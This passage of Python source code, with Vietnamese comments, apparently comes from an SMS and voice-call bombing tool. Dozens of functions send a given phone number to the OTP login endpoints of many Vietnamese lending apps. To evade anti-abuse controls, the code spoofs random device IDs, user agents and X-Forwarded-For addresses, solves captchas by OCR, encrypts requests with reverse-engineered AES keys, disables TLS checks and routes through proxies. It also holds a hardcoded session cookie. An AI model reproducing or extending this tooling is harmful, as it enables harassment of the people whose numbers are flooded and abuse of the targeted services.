                    print("[tokens.json] ⚠️  [gt365] chưa có captchaToken — chạy grab-jwt trước")
                    return ""
            print("[tokens.json] ⚠️  Không tìm thấy id='gt365' trong tokens.json")
            return ""
        except Exception as e:
            print(f"[tokens.json] ❌ Lỗi đọc {p}: {e}")
    print("[tokens.json] ❌ Không tìm thấy tokens.json")
    return ""


_CV2_IOS_UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
)
_CV2_AND_UA_POOL = [
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B)",
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-S901B)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Xiaomi 13 Pro)",
    "Dalvik/2.1.0 (Linux; U; Android 15; POCO X6 Pro)",
]


def _cv2_hdrs(origin: str, mode: str = "android") -> dict:
    ua = _CV2_IOS_UA if mode == "ios" else random.choice(_CV2_AND_UA_POOL)
    base = origin.rstrip("/")
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "User-Agent": ua,
        "Origin": base,
        "Referer": base + "/",
        "X-Device-Id": str(uuid.uuid4()),
        "X-Device-ID-Alt": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": get_random_ip(),
        "Connection": "keep-alive",
    }


async def _cv2_send(
    phone: str,
    api_url: str,
    payload: dict,
    label: str,
    origin: str = "",
    mode: str = "android",
    extra_hdrs: dict | None = None,
) -> bool:
    try:
        hdrs = _cv2_hdrs(origin or api_url.split("/v2")[0], mode)
        if extra_hdrs:
            hdrs.update(extra_hdrs)
        async with httpx.AsyncClient(timeout=20, verify=False) as client:
            r = await client.post(api_url, json=payload, headers=hdrs)
        biz_code = ""
        try:
            d = r.json()
            biz_code = str(d.get("code", ""))
            ok = biz_code in ("200", "0")
            msg = d.get("message", "")
        except Exception:
            ok = r.status_code in (200, 201)
            msg = r.text[:200].replace("\n", " ")
        if ok:
            print(f"[{label}] ✅ OK")
        else:
            print(f"[{label}] ❌ {msg or biz_code}")
        return ok
    except Exception as exc:
        print(f"[{label}] ERR {type(exc).__name__}: {exc}")
        return False


# ── App-Send core ──
_APP_UA_IOS = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
_APP_UA_CF  = "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0"
_APP_UA_CF2 = "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0"


def _xmh_local_phone(phone: str) -> str:
    p = phone.lstrip("+")
    if p.startswith("84"):
        p = "0" + p[2:]
    elif not p.startswith("0"):
        p = "0" + p
    return p


def _app_body_full(ownership: str, app_version: str = "1.1.0"):
    def _build(phone: str, figure_veri) -> dict:
        return {
            "i18n": "vi_VN",
            "reqSource": "Ios",
            "phoneName": "iPhone13,3",
            "appVersion": app_version,
            "androidversion": "iOS18.1",
            "webVersion": "1.0.0",
            "deviceID": str(uuid.uuid4()).upper(),
            "uuid": uuid.uuid4().hex,
            "pagingData": 0,
            "exquisiteItemType": 1,
            "ownerShip": ownership,
            "token": "",
            "phoneNo": phone,
            "veriType": "LOGIN",
            "figureVeri": figure_veri,
        }
    return _build


def _app_body_simple(ownership: str):
    def _build(phone: str, figure_veri) -> dict:
        return {
            "i18n": "vi_VN",
            "reqSource": "Ios",
            "phoneName": "iPhone13,3",
            "appVersion": "1.1.0",
            "ownerShip": ownership,
            "veriType": "LOGIN",
            "figureVeri": figure_veri,
            "phoneNo": phone,
        }
    return _build


async def _app_send(
    phone: str,
    base_url: str,
    endpoint: str,
    headers_fn,
    make_body,
    label: str,
    cap_key: str = "captcha",
    proxy=None,
    _retry: bool = True,
) -> bool:
    if proxy is None:
        proxy = _current_proxy()

    try:
        async with _make_client(timeout=20, follow_redirects=True, proxy=proxy) as c:
            r1 = await c.post(
                f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, False)
            )
            if r1.status_code != 200:
                print(f"[{label}] HTTP {r1.status_code}: {r1.text[:120]}")
                return False
            d1 = r1.json()
            code1 = str(d1.get("code", ""))
            if code1 == "0":
                print(f"[{label}] ✅ OK (lần 1, không cần captcha)")
                return True
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                print(f"[{label}] server từ chối: {d1.get('message') or r1.text[:120]}")
                return False
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f"[{label}] OCR thất bại — captcha len={len(cap_b64)}")
                return False
            r2 = await c.post(
                f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, answer)
            )
            if r2.status_code != 200:
                print(f"[{label}] HTTP {r2.status_code} (sau captcha): {r2.text[:120]}")
                return False
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f"[{label}] ✅ OK (captcha={answer!r})")
            else:
                print(f"[{label}] ❌ server từ chối (sau captcha): {d2.get('message') or r2.text[:120]}")
            return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        if _retry:
            print(f"[{label}] retry lần 2...")
            return await _app_send(
                phone, base_url, endpoint, headers_fn, make_body, label,
                cap_key=cap_key, proxy=proxy, _retry=False,
            )
        return False


# ── QuickQuang ──
_QQ_APP_BASE = "https://ang.quickquangapp.com"


def _qq_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "quiquang_ios",
        "Origin": _QQ_APP_BASE,
        "Referer": _QQ_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_qq_app_body = _app_body_full("quiquang_ios")


async def Call_QQ_SMS(phone):
    return await _app_send(
        phone, _QQ_APP_BASE, "/base/xmh/getSMSCode", _qq_app_hdrs, _qq_app_body, "QQ-SMS"
    )


async def Call_QQ_Voice(phone):
    return await _app_send(
        phone, _QQ_APP_BASE, "/base/xmh/getVoiceCode", _qq_app_hdrs, _qq_app_body, "QQ-Voice"
    )


# ── WanPay Financial ──
_WAN_APP_BASE = "https://wan.wanpaya.com"


def _wan_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "wanpayFinancial_ios",
        "Origin": _WAN_APP_BASE,
        "Referer": _WAN_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_wan_app_body = _app_body_full("wanpayFinancial_ios")


async def Call_Wan_SMS(phone):
    return await _app_send(
        phone, _WAN_APP_BASE, "/base/xmh/getSMSCode", _wan_app_hdrs, _wan_app_body, "Wan-SMS"
    )


async def Call_Wan_Voice(phone):
    return await _app_send(
        phone, _WAN_APP_BASE, "/base/xmh/getVoiceCode", _wan_app_hdrs, _wan_app_body, "Wan-Voice"
    )


# ── PtVayNhanh ──
_PTV_APP_BASE = "https://app.phuthinhvay.com"


def _ptv_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encrypttype": "0",
        "disturbedurl": "0",
        "disturbedpar": "0",
        "ownership": "PTVayNhanh_ios",
        "User-Agent": _APP_UA_CF,
    }


_ptv_app_body = _app_body_simple("PTVayNhanh_ios")


async def Call_PTV_SMS(phone):
    return await _app_send(
        phone, _PTV_APP_BASE, "/lvjKRH/brRsY/JHkuyNids/RlhiPz",
        _ptv_app_hdrs, _ptv_app_body, "PTV-SMS", cap_key="jmJiSn2D1",
    )


async def Call_PTV_Voice(phone):
    return await _app_send(
        phone, _PTV_APP_BASE, "/lvjKRH/brRsY/getVoiceCode",
        _ptv_app_hdrs, _ptv_app_body, "PTV-Voice",
    )


# ── LaviFinance ──
_LAVI_APP_BASE = "https://tin.lavifinancecompany.com"


def _lavi_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "identity",
        "encrypted": "0",
        "encryptType": "0",
        "ownerShip": "laviFinance_ios",
        "User-Agent": _APP_UA_CF2,
    }


_lavi_app_body_raw = _app_body_simple("laviFinance_ios")


def _lavi_app_body(phone: str, figure_veri):
    return _lavi_app_body_raw(_xmh_local_phone(phone), figure_veri)


async def Call_Lavi_SMS(phone):
    return await _app_send(
        phone, _LAVI_APP_BASE, "/base/xmh/getSMSCode", _lavi_app_hdrs, _lavi_app_body, "Lavi-SMS"
    )


async def Call_Lavi_Voice(phone):
    return await _app_send(
        phone, _LAVI_APP_BASE, "/base/xmh/getVoiceCode", _lavi_app_hdrs, _lavi_app_body, "Lavi-Voice",
    )


# ── VayNhanh ──
_VAY_NHANH_BASE = "https://lend.vtnhanh.com"


def _vay_nhanh_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "vtnhanh_ios",
        "Origin": _VAY_NHANH_BASE,
        "Referer": _VAY_NHANH_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_vnhanh_app_body = _app_body_full("vtnhanh_ios")


async def Vay_Nhanh_SMS(phone):
    return await _app_send(
        phone, _VAY_NHANH_BASE, "/base/xmh/getSMSCode",
        _vay_nhanh_hdrs, _vnhanh_app_body, "VayNhanh-SMS",
    )


# ── FBFinance (PublicBankAMC) ──
_FB_FINANCE_BASE = "https://max.vpamc.com"


def _fb_finance_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "publicbankamc_ios",
        "Origin": _FB_FINANCE_BASE,
        "Referer": _FB_FINANCE_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_fbfinance_app_body = _app_body_full("publicbankamc_ios")


async def FB_Finance_SMS(phone):
    return await _app_send(
        phone, _FB_FINANCE_BASE, "/base/xmh/getSMSCode",
        _fb_finance_hdrs, _fbfinance_app_body, "FBFinance-SMS",
    )


# ── SeaBankAsset ──
_SEABANK_ASSET_BASE = "https://lend.seabankassetcompany.com"


def _seabankasset_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "i18n": "hi_IN",
        "reqSource": "Ios",
        "ownerShip": "sealend_ios",
        "encrypted": "0",
        "encryptType": "1",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Origin": "http://lend.seabankassetcompany.com",
        "Referer": "http://lend.seabankassetcompany.com/",
    }


def _seabankasset_body(phone: str, figure_veri) -> dict:
    return {
        "i18n": "hi_IN",
        "reqSource": "Ios",
        "phoneName": "",
        "appVersion": "1.0.0",
        "androidversion": "iPhone18.1",
        "deviceID": uuid.uuid4().hex,
        "pagingData": 0,
        "exquisiteItemType": 1,
        "ownerShip": "sealend_ios",
        "uuid": "",
        "token": "",
        "phoneNo": phone,
        "veriType": "LOGIN",
        "figureVeri": figure_veri if figure_veri else "",
    }


async def seabankasset(phone):
    return await _app_send(
        phone, _SEABANK_ASSET_BASE, "/base/xmh/getSMSCode",
        _seabankasset_hdrs, _seabankasset_body, "SeaBan-SMS",
    )


# ── AChauLoan ──
_ACHAU_APP_BASE = "https://tien.achauloan.com"


def _achau_app_hdrs():
    return {
        "Accept": "*/*",
        "disturbedurl": "0",
        "encrypttype": "1",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "encrypted": "0",
        "Content-Type": "application/json",
        "User-Agent": "vetnam_xingxing_01/6 CFNetwork/1568.200.51 Darwin/24.1.0",
        "ownership": "AChauLoan_ios",
        "disturbedpar": "1",
    }


def _achau_app_body(phone, figure_veri):
    return {
        "reqSource": "Ios",
        "phoneName": "iPhone",
        "appVersion": "1.2.9",
        "androidversion": "iOS 18.1",
        "deviceID": str(uuid.uuid4()).upper(),
        "i18n": "vi-VN",
        "phoneNo": _xmh_local_phone(phone),
        "veriType": "LOGIN",
        "figureVeri": figure_veri,
    }


async def Call_AChau_SMS(phone):
    return await _app_send(
        phone, _ACHAU_APP_BASE, "/AQadQ/Jfmb/goMXd/IuGP",
        _achau_app_hdrs, _achau_app_body, "AChau-SMS",
    )


# ── PetroVay (GPAMCloan) ──
_PETRO_APP_BASE = "https://loan.gpamcloan.com"


def _petro_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "GPAMCloan_ios",
        "Origin": _PETRO_APP_BASE,
        "Referer": _PETRO_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_petro_app_body = _app_body_full("GPAMCloan_ios")


async def Call_Petro_SMS(phone):
    return await _app_send(
        phone, _PETRO_APP_BASE, "/base/xmh/getSMSCode",
        _petro_app_hdrs, _petro_app_body, "Petro-SMS",
    )


async def Call_Petro_Voice(phone):
    return await _app_send(
        phone, _PETRO_APP_BASE, "/base/xmh/getVoiceCode",
        _petro_app_hdrs, _petro_app_body, "Petro-Voice",
    )


# ── Hataco (HTC) ──
_HTC_APP_BASE = "https://tin.hatacocompany.com"


def _htc_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "hatacovay_ios",
        "Origin": _HTC_APP_BASE,
        "Referer": _HTC_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_htc_app_body = _app_body_full("hatacovay_ios", app_version="1.0.2")


async def Call_HTC_SMS(phone):
    return await _app_send(
        phone, _HTC_APP_BASE, "/base/xmh/getSMSCode",
        _htc_app_hdrs, _htc_app_body, "HTC-SMS",
    )


async def Call_HTC_Voice(phone):
    return await _app_send(
        phone, _HTC_APP_BASE, "/base/xmh/getVoiceCode",
        _htc_app_hdrs, _htc_app_body, "HTC-Voice",
    )


# ── RiveCredit ──
_REVE_APP_BASE = "https://lend.revecredit.com"


def _reve_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encrypttype": "0",
        "disturbedurl": "0",
        "disturbedpar": "1",
        "ownership": "RiveCredit_ios",
        "User-Agent": "vnRive/5 CFNetwork/1568.200.51 Darwin/24.1.0",
    }


_reve_app_body_raw = _app_body_simple("RiveCredit_ios")


def _reve_app_body(phone: str, figure_veri):
    return _reve_app_body_raw(_xmh_local_phone(phone), figure_veri)


async def Call_Reve_SMS(phone):
    return await _app_send(
        phone, _REVE_APP_BASE, "/base/xmh/getSMSCode",
        _reve_app_hdrs, _reve_app_body, "Reve-SMS",
    )


async def Call_Reve_Voice(phone):
    return await _app_send(
        phone, _REVE_APP_BASE, "/base/xmh/getVoiceCode",
        _reve_app_hdrs, _reve_app_body, "Reve-Voice",
    )


_VAYCASH_NET_HDR = {
    "x-client-type": "phone",
    "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
}
_MARVAY_NEW_BASE = "https://new.marttimeassrt.com"


async def Call_MarVay_SMS(phone):
    return await _cv2_send(
        phone,
        "https://mvvai.marttimeassrt.com/v2/login/captcha",
        {
            "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
            "app_package_name": "com.maritme.assrt.vn", "platform": "android",
            "type": 1, "app_id": "266000000",
        },
        "MarVay-SMS",
        "https://ios-h5.marttimeassrt.com",
    )


async def Call_MarVay_Voice(phone):
    return await _cv2_send(
        phone,
        "https://mvvii.marttimeassrt.com/v2/login/captcha",
        {
            "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
            "app_package_name": "com.maritme.assrt.vn", "platform": "android",
            "type": 2, "app_id": "266000001",
        },
        "MarVay-Voice",
        "https://ios-h5.marttimeassrt.com",
    )


def _marvay_new_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "marttimeassrt_ios",
        "Origin": _MARVAY_NEW_BASE,
        "Referer": _MARVAY_NEW_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_marvay_new_body = _app_body_full("marttimeassrt_ios")


async def Call_MarVay_New(phone):
    return await _app_send(
        phone, _MARVAY_NEW_BASE, "/base/xmh/getSMSCode",
        _marvay_new_hdrs, _marvay_new_body, "MarVay-New",
        proxy=None,
    )


async def call8(phone):
    headers = {
        "content-type": "application/json; charset=utf-8",
        "x-client-type": "phone",
    }
    payload = {
        "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
        "app_package_name": "com.maritme.assrt.vn", "platform": "android",
        "app_id": "266000001", "type": 2,
    }
    try:
        async with _make_client(timeout=20, verify=False) as client:
            r = await client.post(
                "https://mvvii.marttimeassrt.com/v2/login/captcha",
                json=payload, headers=headers,
            )
        ok = r.status_code == 200
        print(f"[call8] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
        return ok
    except Exception as e:
        print(f"[call8] ERR {type(e).__name__}: {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# NHÓM 2 — VVAY AES-CBC FRAMEWORK
# Các dịch vụ dùng chung _vvay_encrypt / _lt_generic:
#   V88Dong · SenVay · ITake
# ══════════════════════════════════════════════════════════════════════════════

# ── VVay AES-CBC core ──
_VVAY_KEY = b"aajiaozicashmeh5"
_VVAY_IV  = b"hajiaozicashmeh5"


def _vvay_encrypt(data) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, indent=2, separators=(",", " : "))
    ct = AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).encrypt(pad(data.encode(), 16))
    return base64.b64encode(ct).decode()


def _vvay_encrypt_path(path: str) -> str:
    ct = AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).encrypt(pad(path.encode(), 16))
    return base64.b64encode(ct).decode()


def _vvay_decrypt(b64_str: str):
    ct = base64.b64decode(b64_str)
    plain = unpad(AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).decrypt(ct), 16)
    text = plain.decode("utf-8").strip()
    try:
        return json.loads(text)
    except Exception:
        return text


# ── LT Generic (SenVay family) ──
def _lt_rand_path() -> str:
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    return "/h5/" + "".join(random.choice(chars) for _ in range(32))


async def _lt_generic(
    phone: str, is_voice: bool, host: str, app_id: str, ua_token: str, version: str = "1.0.0_1.0.2"
) -> bool:
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    path = "/login/requestVerifyCode"
    gw_path = _lt_rand_path()
    device_id = uuid.uuid4().hex
    label = f"{ua_token} {'Voice' if is_voice else 'SMS'}"
    headers = {
        "appId": app_id,
        "language": "vi-VN",
        "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) {ua_token}",
        "Referer": f"https://{host}/login",
        "fpPlatform": "2",
        "Origin": f"https://{host}",
        "real_path": path,
        "fpDeviceId": "",
        "version": version,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "x_x_path": _vvay_encrypt_path(path),
        "loginPlatform": "APP",
        "marketToken": "",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
    body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
    try:
        async with httpx.AsyncClient(timeout=15, verify=False) as client:
            r = await client.post(
                f"https://{host}{gw_path}", headers=headers, content=body.encode()
            )
        if r.status_code == 200:
            try:
                d = _vvay_decrypt(r.text.strip())
            except Exception:
                print(f"[{label}] ERR không decrypt được response: {r.text[:200]!r}")
                return False
            ok = isinstance(d, dict) and (d.get("successful") is True or d.get("code") == 200)
            if not ok:
                print(f"[{label}] server từ chối: {d.get('msg') if isinstance(d, dict) else d}")
            return ok
        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


# ── SenVay ──
async def Call_SenVay(phone):
    return await _lt_generic(phone, False, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")


async def Call_SenVay_Voice(phone):
    return await _lt_generic(phone, True, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")


# ── LuckyTien ──
async def Call_LuckyTien(phone):
    return await _lt_generic(phone, False, "h5.luckytien.com", "58", "luckytien", "1.0.0_1.0.2")


async def Call_LuckyTien_Voice(phone):
    return await _lt_generic(phone, True, "h5.luckytien.com", "58", "luckytien", "1.0.0_1.0.2")


# ── EasyOkVN (giống _lt_generic của SenVay/HappyGoo + thêm bước operationRecord/save
#    kiểu V88Dong, vì sniff cho thấy 2 domain riêng: api.easyokvn.com (gọi thẳng,
#    UA "24Bot/1 CFNetwork...") và h5.easyokvn.com (gateway path ngẫu nhiên 32 ký tự,
#    UA Mozilla + hậu tố "easyok", giống hệt _lt_rand_path()/_lt_generic) ──
async def _easyok_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
    session_id = "".join(random.choices(string.ascii_lowercase, k=32))
    headers = {
        "appId": "38",
        "Accept": "*/*",
        "version": "1.0.4",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "platform": "2",
        "token": "",
        "deviceId": device_id,
        "User-Agent": "24Bot/1 CFNetwork/1568.200.51 Darwin/24.1.0",
        "Content-Type": "application/json",
    }
    body = {
        "operationCode": "app_start_new",
        "sessionId": session_id,
        "operationTime": str(int(time.time() * 1000)),
    }
    try:
        await client.post(
            "https://api.easyokvn.com/member/operationRecord/save", headers=headers, json=body
        )
    except Exception:
        pass


async def _easyok_generic(phone: str, is_voice: bool) -> bool:
    mobile = phone if phone.startswith("0") else ("0" + phone[2:] if phone.startswith("84") else phone)
    device_id = uuid.uuid4().hex
    host = "h5.easyokvn.com"
    app_id = "38"
    ua_token = "easyok"
    version = "1.0.4_1.1.4"
    path = "/login/requestVerifyCode"
    gw_path = _lt_rand_path()
    label = f"EasyOkVN {'Voice' if is_voice else 'SMS'}"
    headers = {
        "appId": app_id,
        "language": "vi-VN",
        "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) {ua_token}",
        "Referer": f"https://{host}/login",
        "fpPlatform": "2",
        "Origin": f"https://{host}",
        "real_path": path,
        "fpDeviceId": "",
        "version": version,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "x_x_path": _vvay_encrypt_path(path),
        "loginPlatform": "APP",
        "marketToken": "",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
    body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
    try:
        async with _make_client(timeout=20) as client:
            await _easyok_operation_record_save(client, device_id)
            r = await client.post(f"https://{host}{gw_path}", headers=headers, content=body.encode())
        if r.status_code == 200:
            try:
                d = _vvay_decrypt(r.text.strip())
            except Exception:
                print(f"[{label}] ERR không decrypt được response: {r.text[:200]!r}")
                return False
            ok = isinstance(d, dict) and (d.get("successful") is True or d.get("code") == 200)
            if not ok:
                print(f"[{label}] server từ chối: {d.get('msg') if isinstance(d, dict) else d}")
            return ok
        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


async def Call_EasyOkVN(phone):
    return await _easyok_generic(phone, is_voice=False)


async def Call_EasyOkVN_Voice(phone):
    return await _easyok_generic(phone, is_voice=True)


# ── HappyGoo ──
async def Call_HappyGoo(phone):
    return await _lt_generic(phone, False, "h5.6happygoovn.com", "28", "happygoo", "1.0.6_1.8.6")


async def Call_HappyGoo_Voice(phone):
    return await _lt_generic(phone, True, "h5.6happygoovn.com", "28", "happygoo", "1.0.6_1.8.6")


# ── V88Dong ──
_V88_BASE    = "https://api.v88dong.com"
_V88_APP_ID  = "59"
_V88_VERSION = "1.0.0_0.0.0"
_V88_UA      = "V88Dong/200 CFNetwork/1568.200.51 Darwin/24.1.0"


def _v88_base_headers(device_id: str, x_x_path: str = "") -> dict:
    headers = {
        "appId": _V88_APP_ID,
        "language": "vi-VN",
        "User-Agent": _V88_UA,
        "country": "vn",
        "fpPlatform": "5",
        "fpDeviceId": device_id,
        "version": _V88_VERSION,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "loginPlatform": "APP",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "marketToken": "",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Encoding": "identity",
        "Connection": "keep-alive",
    }
    if x_x_path:
        headers["x_x_path"] = x_x_path
        headers["Accept"] = "application/json"
    return headers


async def _v88_check_side_b_plain(client: httpx.AsyncClient, device_id: str) -> None:
    headers = {
        "appId": _V88_APP_ID, "Accept": "*/*", "version": _V88_VERSION,
        "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "identity",
        "platform": "2", "token": "", "deviceId": device_id,
        "User-Agent": _V88_UA, "Content-Type": "application/json",
    }
    try:
        await client.post(f"{_V88_BASE}/login/check-side-b", headers=headers, content=b"")
    except Exception:
        pass


async def _v88_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
    session_id = "".join(random.choices(string.ascii_lowercase, k=32))
    headers = _v88_base_headers(device_id)
    body = {
        "operationCode": "app_start_new",
        "sessionId": session_id,
        "operationTime": str(int(time.time() * 1000)),
    }
    try:
        await client.post(f"{_V88_BASE}/member/operationRecord/save", headers=headers, json=body)
    except Exception:
        pass


async def _v88_check_side_b_h5(client: httpx.AsyncClient, device_id: str, phone: str) -> None:
    gw_path = f"/h5/{device_id}"
    headers = _v88_base_headers(device_id, _vvay_encrypt_path("/login/check-side-b"))
    body = _vvay_encrypt({"phone": phone, "deviceId": device_id})
    try:
        await client.post(f"{_V88_BASE}{gw_path}", headers=headers, content=body.encode())
    except Exception:
        pass


async def _v88_check_phone_no(client: httpx.AsyncClient, device_id: str, phone: str) -> None:
    path = "/login/checkPhoneNo"
    headers = _v88_base_headers(device_id, _vvay_encrypt_path(path))
    try:
        await client.get(f"{_V88_BASE}{path}", params={"phone": phone}, headers=headers)
    except Exception:
        pass


async def _v88_request_verify_code(
    client: httpx.AsyncClient, device_id: str, phone: str, is_voice: bool
) -> bool:
    path = "/login/requestVerifyCode"
    gw_path = f"/h5/{device_id}"
    x_x_path = _vvay_encrypt_path(path)
    body = _vvay_encrypt({"phone": phone, "isVoice": is_voice, "h5": False})
    headers = _v88_base_headers(device_id, x_x_path)
    label = "V88Dong Voice" if is_voice else "V88Dong SMS"
    try:
        r = await client.post(f"{_V88_BASE}{gw_path}", headers=headers, content=body.encode())
        if r.status_code == 200:
            raw = r.text.strip()
            try:
                d = _vvay_decrypt(raw)
            except Exception:
                print(f"[{label}] ERR phan hoi khong phai base64 hop le: {raw[:200]!r}")
                return False
            code = d.get("code") if isinstance(d, dict) else None
            if code != 200 and isinstance(d, dict):
                print(f"[{label}] server tu choi: {d.get('msg')}")
            return code == 200
        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


async def _v88_send(phone: str, is_voice: bool) -> bool:
    device_id = uuid.uuid4().hex
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    async with _make_client(timeout=20) as client:
        await _v88_check_side_b_plain(client, device_id)
        await _v88_operation_record_save(client, device_id)
        await _v88_check_side_b_h5(client, device_id, mobile)
        await _v88_check_phone_no(client, device_id, mobile)
        return await _v88_request_verify_code(client, device_id, mobile, is_voice)


async def Call_V88Dong(phone):
    return await _v88_send(phone, is_voice=False)


async def Call_V88DongVoice(phone):
    return await _v88_send(phone, is_voice=True)


# ── ITake ──
_ITAKE_BASE = "https://h5.6itake-moment.com"


async def Call_ITake(phone):
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    device_id = uuid.uuid4().hex
    check_id  = uuid.uuid4().hex
    base_h = {
        "fpPlatform": "5", "appId": "20", "language": "vi-VN",
